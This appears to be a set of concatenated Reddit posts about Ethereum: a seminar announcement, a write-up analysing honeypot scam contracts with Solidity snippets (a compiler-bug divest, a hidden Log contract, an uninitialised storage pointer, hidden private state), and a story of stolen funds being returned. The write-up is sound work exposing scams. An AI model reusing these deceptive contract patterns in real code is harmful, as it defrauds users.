and largely unexplored, and initial progress will lead to more advanced study.### AccreditationOne of the first contracts we will develop in the seminars is an accreditation contract. The logic will be very simple, as will the application process.To become accredited, one must independently make significant progress on a pre-approved cryptoeconomic primitive. More details on the accreditation process and policy will be announced next week.### Interested?- If you'd like a chance to attend the seminars live, respond to my comment below asking for seminar timing preferences. We'll aim for a schedule that allows as many people as possible to attend some of the seminars.- [sign up for the mailing list](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa), and expect to see a schedule with seminar titles and details mailed out later this week!- Feel free to check out our slack ([invite here](https://cp-slack-invite.herokuapp.com/)) to say hi or get a peek at the kinds of projects we'll focus on!- Keep an eye on [the website](http://cpacademy.io), which will be built up over the next few days.",False,"Creating useful dapps is easier than people think (way easier than CryptoZombies, for example).

I've also been wanting to contribute to the ethereum community more and so I thought this would be a perfect opportunity to do a little write up that would go over the details of some of these contracts. There will be a bit of code in this post, though nothing too complex. Hopefully this will serve as an educational piece, but bear with me as I don't often write posts.### Dividend Distributorhttps://etherscan.io/address/0x858c9eaf3ace37d2bedb4a1eb6b8805ffe801bba#codeThis smart contract takes advantage of a Solidity compiler bug detailed here:  https://etherscan.io/solcbuginfo?a=SkipEmptyStringLiteral. This bug results in skipping the empty string literal `''` when passed in as a function argument. Here's the code for the function of interest:         function divest(uint amount) public {        if ( investors[msg.sender].investment == 0 || amount == 0)            throw;        // no need to test, this will throw if amount > investment        investors[msg.sender].investment -= amount;        sumInvested -= amount;         this.loggedTransfer(amount, '', msg.sender, owner);    }    Any investor trying to divest will be in for a rude awakening when their ether is transferred to the owner's address. The bug results in this line of code `this.loggedTransfer(amount, '', msg.sender, owner)` being translated to `this.loggedTransfer(amount, msg.sender, owner)` and so the owner is the true recipient. ### Private Bankhttps://etherscan.io/address/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12#codeThis contract makes use of the same bug found in the infamous DAO hack. Here's the code of interest:    if(msg.sender.call.value(_am)()) {        balances[msg.sender] -= _am;        TransferLog.AddMessage(msg.sender, _am, 'CashOut');    }For anyone not familiar with the interworkings of the DAO hack, the line `msg.sender.call.value` sends the remaining gas with the `call` function, whereas `msg.sender.send(value)` only sends a fixed stipend of 2300 gas. Normally, `msg.sender` would be a typical wallet address, but in the case where it is a smart contract address the fallback function is invoked. The key here is that the ether being sent is not subtracted from the balance until *after* it is sent. If it was subtracted before, this recursive attack would not work. So all the fallback function has to do is call the `withdraw` function and add in logic to make sure it doesn't take more ether than the contract holds.So what's wrong here? The answer lies in the `TransferLog.AddMessage` call. You may have noticed that the Log contract source was posted to etherscan, only that wasn't the real source code. Notice how the contstructor of PrivateBank sets the address of the real Log contract. All the creator of this contract had to do was make sure that the real Log contract had a function with the same signature as the `AddMessage` function posted. The real source code probably looks something like:     function AddMessage(address _sender, uint256 _amount, string _message) {        // note that this is not valid solidity        require(_sender == owner || _message == 'Deposit');        // and so on ...     }This translates to: if the sender isn't me or someone isn't depositing ether then fail, which will revert all state changes, thus never allowing you to withdraw your ether.### Open Address Lottery https://etherscan.io/address/0xd1915A2bCC4B77794d64c4e483E43444193373Fa#codeThis contract scams participants by masquerading as a legitimate lottery, but of course it's not. The malicious code is disguised by a subtle solidity quirk. Take a look at this function:         function forceReseed() { //reseed initiated by the owner - for testing purposes        require(msg.sender==owner);                SeedComponents s;        s.component1 = uint(msg.sender);        s.component2 = uint256(block.blockhash(block.number - 1));        s.component3 = block.difficulty*(uint)(block.coinbase);        s.component4 = tx.gasprice * 7;            reseed(s); //reseed    }You'll notice that an instance of the struct SeedComponent is created. Most programmers, familiar with other popular programming languages, would assume that s is a local instance of the SeedComponent struct ie. it goes on the runtime stack. However, in Solidity any *complex* data type is implicitly a storage pointer unless otherwise specified. This results in component1 pointing to index 0, component2 pointing to index 1, and so forth. The `LuckyNumber` variable lives at index 3 and is assigned the value of `tx.gasprice * 7`. This makes it impossible to win, as the winner is selected via a function that looks like `NotSoRandomNumber % 2`.Here the owner calls the `forceReseed` function:https://etherscan.io/tx/0xf554329a9b949b408d9c75614261ae48d38c818a3f4df970cfeef7f48c2238c4And here's documentation outlining this quirk (it's pretty easy to gloss over it):http://solidity.readthedocs.io/en/develop/types.html### New Years Gifthttps://etherscan.io/address/0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B#codeThis contract takes advantage of a small flaw in a third party resource that many of us use, etherscan. The flaw being that etherscan doesn't show contract A calling functions from contract B as a transaction under contracts B's history, making it easy to obfuscate function calls. Basically, this contract works by allowing the user to set the `hashPass` only if `passHasBeenSet` is false. Anyone who knows the input that produced the value of `hashPass` can claim the funds of this contract by calling `GetGift`. Of course, the storage variable `passHasBeenSet` is private and therefore not readable via etherscan. Luckily, we can use web3 and check the value of the variable ourselves:     > web3.eth.getStorageAt('0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B', 1)    < '0x00000000000000000000008ca354f7e84881157bdbc36d8c40d5b5077621b601'Note that `sender` and `passHasBeenSet` belong to the same storage slot since addresses take up 20 bytes and booleans take up 1 byte (storage slots are 32 bytes). Therefore the last two characters belong to `passHasBeenSet`, which has a value of 01 -> true.On a side note, I've contacted etherscan about this issue and I imagine they will fix this at some point - which reminds me; a friend of mine recently contacted etherscan about another *flaw* where the contract source code wasn't being wrapped. Someone posted a very similar honeypot to this one where there was code being prefixed by a ridiculous number of spaces resulting in the code being rendered off screen (unless you happened to see the tiny horizontal scrollbar and scrolled over). Etherscan has since fixed this issue, in a timely matter too. ### SummaryIf anything, I hope this has been an entertaining read.

Maybe some of you have seen that. Deleted the post by now due to privacy reasons but they stole like 10k$ in ETH, ERC20 and ETH L2s. The reason for the hack was most likely the flawed TustWallet extension, when I used it immediately after CZ Binance had posted about it. They left me a message on chain saying:We are white hat. We found a problem with your wallet and to protect the funds we moved them out to store them securely. Please send a transaction from current and new wallet to verify yourself and get the funds backFor me that sounded like they are just messing with me. I have send then indeed a transaction from the hacked address and new address. Nothing happened for like 2 days. I had given up on that money. I contacted TrustWallet Support, they told me that I should send a few 0 ETH transactions to the account, where my stolen funds were sitting and include my new address as a message. And yeah now 5 days later, they have sent me all funds back. I would never in a thousand years have believed that I will ever get that funds back. And that is not all: I was actively DCA'ing on that compromised wallet. They saved me from a huge misery in a couple of months! I told them in some of my on chain messages to keep 20% as a fee, but they didn't. They send me the full amount back. So does anyone know a charity or so that accepts ETH donations? I wanna donate a small part of this money ☺️EDIT: Donated around 500$ to GiveDirectly https://www.givedirectly.org/ and Trees For The Future https://trees.org/crypto/. Plus I am going to donate a similar amount to a local charity of my hometown!That is it for donating from my side, so you can stop sending DM's ;)",False,I got hacked and hackers send me funds back ❤️,,3,531,0.96,https://www.reddit.com/r/ethereum/comments/11wlqwx/i_got_hacked_and_hackers_send_me_funds_back/,[]
